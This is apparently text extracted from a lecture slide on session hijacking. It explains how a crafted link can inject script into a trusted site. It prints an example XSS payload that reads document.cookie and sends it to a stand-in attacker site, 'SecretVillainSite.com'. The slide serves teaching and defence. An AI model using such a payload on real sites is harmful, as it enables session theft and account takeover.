@@ -1,0 +1,15 @@
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(3) Session Hijacking (II)
+Example:
+An attackers may distribute emails or IM messages with a specially crafted link
+pointing to a known and trusted website but containing HTTP query parameters that
+exploit a known vulnerability to inject script code. For an XSS attack used for session
+hijacking, the code might send the session key to the attacker’s own website, for
+instance:,
+http://www.TrustedSearchEngine.com/search?<script>location.href='http://www.Se
+cretVillainSite.com/hijacker.php?cookie='+document.cookie;</script>
+This would read the current session cookie using document.cookie and send it to the
+attacker’s website by setting the location URL in the browser using location.href.
